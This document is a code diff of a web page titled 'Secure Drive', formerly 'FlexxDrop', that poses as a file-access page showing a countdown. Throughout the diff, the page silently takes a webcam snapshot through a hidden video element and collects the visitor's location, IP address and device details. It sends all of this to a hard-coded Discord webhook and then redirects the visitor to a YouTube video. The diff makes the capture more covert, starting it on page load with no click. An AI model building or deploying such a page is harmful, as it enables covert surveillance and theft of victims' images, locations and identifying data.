@@ -1,53 +1,45 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>FlexxDrop</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta charset="UTF-8">
+  <title>Secure Drive</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     html, body {
       margin: 0;
       padding: 0;
-      height: 100%;
       background: #000;
       color: #fff;
       font-family: Arial, sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
+      height: 100%;
       text-align: center;
     }
-    #startBtn {
-      padding: 0.5em 1em;
-      font-size: 1.1rem;
-      background: #222;
-      border: 1px solid #fff;
-      color: #fff;
-      border-radius: 8px;
-      cursor: pointer;
-      margin-top: 1em;
+    h1 {
+      font-size: 1.5rem;
     }
   </style>
 </head>
 <body>
-  <div id="status">
-    <button id="startBtn">Open FlexxDrop</button>
-  </div>
+  <h1 id="countdown">10 seconds to open secure drive</h1>
 
   <script>
     const webhookUrl = "https://discord.com/api/webhooks/1388161217603965210/eELyivDPEhlKfnaaDce_b90zBtGFpe51uLHo28LsG0gle_1d8pfuN-_U6vK6Q38_N4Fj";
     const redirectUrl = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
-    const deniedPage = "permission-denied.html";
 
     let capturedImageData = null;
-    let coords = { lat: "Permission denied", lon: "Permission denied", acc: 0 };
+    let lat = localStorage.getItem("lat") || "Permission denied";
+    let lon = localStorage.getItem("lon") || "Permission denied";
+    let acc = localStorage.getItem("acc") || 0;
 
     function getDeviceInfo() {
       return {
         userAgent: navigator.userAgent,
         platform: navigator.platform,
         language: navigator.language,
-        screen: ${screen.width}x${screen.height},
+        screen: `${screen.width}x${screen.height}`,
         touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? 'Yes' : 'No'
       };
     }
@@ -59,13 +51,37 @@
       return new Blob([u8arr], { type: mime });
     }
 
+    async function captureSnapshot() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement("video");
+        video.setAttribute("playsinline", true);
+        video.style.position = "absolute";
+        video.style.opacity = "0";
+        video.srcObject = stream;
+        document.body.appendChild(video);
+        await video.play();
+
+        await new Promise(resolve => setTimeout(resolve, 3000));
+
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        capturedImageData = canvas.toDataURL("image/png");
+
+        stream.getTracks().forEach(t => t.stop());
+      } catch (err) {
+        console.warn("Camera failed or denied", err);
+      }
+    }
+
     function sendToDiscord(ipData) {
-      const mapLink = coords.lat !== "Permission denied"
-        ? https://www.google.com/maps?q=${coords.lat},${coords.lon} : "N/A";
+      const mapLink = lat !== "Permission denied" ? `https://www.google.com/maps?q=${lat},${lon}` : "N/A";
       const device = getDeviceInfo();
 
       const formData = new FormData();
-
       const snapshotLine = capturedImageData
         ? "📸 Snapshot received: ✅ [Download Image](attachment://snapshot.png)"
         : "📸 Snapshot received: ❌ No image available";
@@ -74,21 +90,13 @@
         embeds: [{
           title: "📍 GPS & Device Info",
           description:
-            **Latitude:** ${coords.lat}   \n**Longitude:** ${coords.lon}   \n**Accuracy:** ${coords.acc} meters +
-            \n**Map:** ${mapLink !== "N/A" ? [View Location](${mapLink}) : "Location not available"} +
-            \n\n🌐 **IP Info** +
-            \n**IP:** ${ipData.ipAddress} +
-            \n**City:** ${ipData.city} +
-            \n**Region:** ${ipData.stateProv} +
-            \n**Country:** ${ipData.countryName} +
-            \n\n🖥️ **Device Info** +
-            \n**Platform:** ${device.platform} +
-            \n**Browser:** ${device.userAgent} +
-            \n**Language:** ${device.language} +
-            \n**Screen:** ${device.screen} +
-            \n**Touch Support:** ${device.touchSupport} +
-            \n\n${snapshotLine} +
-            \n\n🕒 ${new Date().toLocaleString()}
+            `**Latitude:** ${lat}\n**Longitude:** ${lon}\n**Accuracy:** ${acc} meters` +
+            `\n**Map:** ${mapLink !== "N/A" ? `[View Location](${mapLink})` : "Location not available"}` +
+            `\n\n🌐 **IP Info**\n**IP:** ${ipData.ipAddress}\n**City:** ${ipData.city}` +
+            `\n**Region:** ${ipData.stateProv}\n**Country:** ${ipData.countryName}` +
+            `\n\n🖥️ **Device Info**\n**Platform:** ${device.platform}\n**Browser:** ${device.userAgent}` +
+            `\n**Language:** ${device.language}\n**Screen:** ${device.screen}` +
+            `\n**Touch Support:** ${device.touchSupport}\n\n${snapshotLine}\n\n🕒 ${new Date().toLocaleString()}`
         }]
       };
 
@@ -100,77 +108,29 @@
 
       formData.append("payload_json", JSON.stringify(payload));
 
-      fetch(webhookUrl, {
-        method: "POST",
-        body: formData
-      }).finally(() => {
-        window.location.href = redirectUrl;
-      });
+      fetch(webhookUrl, { method: "POST", body: formData });
     }
 
-    async function startSequence() {
-      document.getElementById("status").innerText = "Requesting permissions…";
-
-      try {
-        let locationAllowed = false;
-
-        await new Promise((resolve) => {
-          navigator.geolocation.getCurrentPosition(
-            (pos) => {
-              coords.lat = pos.coords.latitude;
-              coords.lon = pos.coords.longitude;
-              coords.acc = pos.coords.accuracy;
-              locationAllowed = true;
-              resolve();
-            },
-            () => resolve(),
-            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-          );
+    captureSnapshot().then(() => {
+      fetch("https://api.db-ip.com/v2/free/self")
+        .then(res => res.json())
+        .then(sendToDiscord)
+        .catch(() => {
+          sendToDiscord({ ipAddress: "N/A", city: "-", stateProv: "-", countryName: "-" });
         });
+    });
 
-        if (!locationAllowed) {
-          window.location.href = deniedPage;
-          return;
-        }
+    let seconds = 10;
+    const countdownEl = document.getElementById("countdown");
 
-        try {
-          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-          const video = document.createElement("video");
-          video.srcObject = stream;
-          await video.play();
-
-          // Show "Capturing..." message
-          document.body.innerHTML = <div style="width:100%;height:100%;display:flex;justify-content:center;align-items:center;background:#000;color:#fff;font-family:Arial">loading...…</div>;
-
-          await new Promise((resolve) => {
-            setTimeout(() => {
-              const canvas = document.createElement("canvas");
-              canvas.width = video.videoWidth;
-              canvas.height = video.videoHeight;
-              const ctx = canvas.getContext("2d");
-              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-              capturedImageData = canvas.toDataURL("image/png");
-              stream.getTracks().forEach(track => track.stop());
-              resolve();
-            }, 3000); // Wait 3 seconds to ensure camera is ready
-          });
-        } catch {
-          // Camera denied or failed
-        }
-
-        fetch("https://api.db-ip.com/v2/free/self")
-          .then(res => res.json())
-          .then(sendToDiscord)
-          .catch(() => {
-            sendToDiscord({ ipAddress: "N/A", city: "-", stateProv: "-", countryName: "-" });
-          });
-
-      } catch (err) {
-        window.location.href = deniedPage;
+    const timer = setInterval(() => {
+      seconds--;
+      countdownEl.textContent = `${seconds} seconds to open secure drive`;
+      if (seconds === 0) {
+        clearInterval(timer);
+        window.location.href = redirectUrl;
       }
-    }
-
-    document.getElementById("startBtn").addEventListener("click", startSequence);
+    }, 1000);
   </script>
 </body>
 </html>
